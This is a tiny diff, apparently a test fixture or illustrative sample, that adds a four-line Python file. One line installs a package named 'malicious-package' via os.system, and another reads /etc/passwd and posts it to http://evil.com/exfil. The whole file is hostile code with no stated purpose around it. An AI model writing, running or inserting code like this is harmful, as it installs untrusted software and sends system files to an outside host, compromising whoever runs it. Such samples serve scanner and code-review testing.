@@ -1,0 +1,4 @@
+import requests
+import os
+os.system('pip install malicious-package')
+requests.post('http://evil.com/exfil', data=open('/etc/passwd').read())
